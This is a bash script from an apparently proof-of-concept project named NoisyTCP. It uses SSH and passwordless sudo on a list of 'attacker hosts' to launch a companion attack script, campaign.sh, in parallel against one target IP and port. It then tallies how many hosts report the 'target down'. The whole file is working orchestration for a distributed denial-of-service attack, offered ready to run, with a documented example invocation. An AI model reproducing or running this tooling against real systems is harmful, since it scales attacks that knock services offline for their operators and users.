#!/usr/bin/env bash
# NoisyTCP fleet driver: run lab/campaign.sh on several attacker hosts at once.
#
#   ./lab/fleet.sh --target 203.0.113.10 --port 25565 --hosts hosts.txt
#   ./lab/fleet.sh --target 203.0.113.10 --port 25565 --hosts hosts.txt \
#                  --path '~/NoisyTCP-PoC' --extra "--instances 2 --pulse-ms 250"
#
# hosts.txt is one ssh destination per line (user@host), '#' starts a comment.
# Requires key-based ssh and passwordless sudo on every host (BatchMode=yes).
# Each host runs its own preflight probe, so a host whose path drops fragments
# aborts on its own without wasting the run.

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(dirname "$SELF_DIR")"

TARGET=""; PORT=""; HOSTS=""; RPATH='$HOME/NoisyTCP-PoC'; EXTRA=""
LOGDIR="$ROOT/lab/fleet-$(date +%Y%m%d-%H%M%S)"

die() { echo "[-] $*" >&2; exit 1; }
log() { echo "[*] $*" >&2; }

usage() {
    cat >&2 <<'EOF'
Usage: ./lab/fleet.sh --target IP --port P --hosts FILE [opts]

  --target IP     single target IPv4 (required)
  --port P        target TCP port (required)
  --hosts FILE    ssh destinations, one per line (required)
  --path DIR      repo path on the remote hosts (def $HOME/NoisyTCP-PoC)
  --extra "ARGS"  extra args passed to campaign.sh verbatim
  -h, --help      this text
EOF
}

while [ $# -gt 0 ]; do
    case "$1" in
        --target) TARGET=${2:?}; shift 2 ;;
        --port)   PORT=${2:?};   shift 2 ;;
        --hosts)  HOSTS=${2:?};  shift 2 ;;
        --path)   RPATH=$2;      shift 2 ;;
        --extra)  EXTRA=$2;      shift 2 ;;
        -h|--help) usage; exit 0 ;;
        *) die "unknown argument: $1" ;;
    esac
done

[ -n "$TARGET" ] && [ -n "$PORT" ] || { usage; exit 1; }
[ -n "$HOSTS" ] && [ -r "$HOSTS" ] || die "hosts file not readable: ${HOSTS:-<empty>}"

mkdir -p "$LOGDIR"
log "target $TARGET:$PORT, log dir $LOGDIR"

mapfile -t HOSTLIST < <(sed -e 's/#.*//' -e '/^[[:space:]]*$/d' "$HOSTS")
[ "${#HOSTLIST[@]}" -gt 0 ] || die "no hosts in $HOSTS"

declare -A PID2HOST=()
for h in "${HOSTLIST[@]}"; do
    safe=$(echo "$h" | tr -c 'A-Za-z0-9._-' '_')
    out="$LOGDIR/$safe.log"
    log "-> $h"
    ssh -o BatchMode=yes -o ConnectTimeout=5 -o ServerAliveInterval=15 \
        "$h" "cd $RPATH && sudo -n ./lab/campaign.sh --target $TARGET --port $PORT $EXTRA" \
        >"$out" 2>&1 &
    PID2HOST[$!]=$h
done

DOWN=0; FAILED=0
for p in "${!PID2HOST[@]}"; do
    if wait "$p"; then
        log "ok   ${PID2HOST[$p]}  (target down)"
        DOWN=$((DOWN + 1))
    else
        log "fail ${PID2HOST[$p]}  (see $LOGDIR)"
        FAILED=$((FAILED + 1))
    fi
done

log "fleet summary: down_reports=$DOWN failed_or_survived=$FAILED total=${#HOSTLIST[@]}"
[ "$DOWN" -gt 0 ] && exit 0
exit 1
